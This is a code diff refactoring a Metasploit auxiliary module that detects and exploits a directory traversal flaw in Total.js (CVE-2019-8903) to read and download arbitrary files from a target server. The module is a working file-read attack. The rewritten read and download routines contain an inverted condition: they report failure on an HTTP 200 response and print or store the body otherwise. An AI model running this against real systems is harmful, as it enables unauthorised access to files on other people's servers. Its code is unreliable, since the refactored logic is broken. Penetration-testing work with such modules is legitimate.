@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 # Check and exploit Total.js Directory Traversal (CVE-2019-8903)
 class MetasploitModule < Msf::Auxiliary
@@ -68,7 +66,7 @@ class MetasploitModule < Msf::Auxiliary
         print_status("App version: #{json['version']}")
         return Exploit::CheckCode::Vulnerable
       end
-    elsif res && res.headers['X-Powered-By'] =~ [Ttoaljs]
+    elsif res && res.headers['X-Powered-By'].to_s.downcase.include?('total.js')
       print_status('Target appear to be vulnerable!')
       print_status("X-Powered-By: #{res.headers['X-Powered-By']}")
       return Exploit::CheckCode::Detected
@@ -86,16 +84,18 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
       'uri' => uri
     )
-    if res && res.code == 200
-      print_status("Getting #{datastore['FILE']}...")
-      print_line(res.body)
-    elsif res && res.code != 200
-      print_error("Unable to read '#{datastore['FILE']}', possibily because:")
+    unless res
+      print_error 'Generic error'
+      return
+    end
+    unless res.code != 200
+      print_error("Unable to read '#{datastore['FILE']}', possibly because:")
       print_error("\t1. File does not exist.")
       print_error("\t2. No permission.")
-    else
-      print_error("[#{target_host}] - Generic error")
+      return
     end
+    print_status("Getting #{datastore['FILE']}...")
+    print_line(res.body)
   end
 
   def download
@@ -106,28 +106,29 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
       'uri' => uri
     )
-    if res && res.code == 200
-      fname = datastore['FILE'].split('/')[-1].chop
-      ctype = res.headers['Content-Type'].split(';')
-      loot = store_loot('lfi.data', ctype[0], rhost, res.body, fname)
-      print_good("File #{fname} downloaded to: #{loot}")
-    elsif res && res.code != 200
-      print_error("Unable to read '#{datastore['FILE']}', possibily because:")
+    unless res
+      print_error 'Generic error'
+      return
+    end
+    unless res.code != 200
+      print_error("Unable to read '#{datastore['FILE']}', possibly because:")
       print_error("\t1. File does not exist.")
       print_error("\t2. No permission.")
-    else
-      print_error("[#{target_host}] - Generic error")
+      return
     end
+    fname = datastore['FILE'].split('/')[-1].chop
+    ctype = res.headers['Content-Type'].split(';')
+    loot = store_loot('lfi.data', ctype[0], rhost, res.body, fname)
+    print_good("File #{fname} downloaded to: #{loot}")
   end
 
   def run
-    if action.name == 'CHECK'
+    case action.name
+    when 'CHECK'
       check
-
-    elsif action.name == 'READ'
+    when 'READ'
       read
-
-    elsif action.name == 'DOWNLOAD'
+    when 'DOWNLOAD'
       download
     end
   end
